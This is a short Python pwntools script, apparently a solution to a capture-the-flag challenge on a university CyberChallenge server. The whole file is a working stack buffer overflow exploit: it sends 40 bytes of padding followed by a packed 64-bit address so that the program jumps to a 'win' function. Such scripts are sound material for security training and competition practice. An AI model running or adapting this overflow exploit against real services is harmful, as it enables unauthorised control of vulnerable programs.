from pwn import p64, remote, process

r = remote('cyberchallenge.disi.unitn.it', 9002)
# r = process('./bin')

offset = 40
win_addr = 0x0000000000401186

r.sendlineafter(b'?', b'A' * offset + p64(win_addr))

res = r.recvall(timeout=1)
print(res.decode(errors='ignore'))
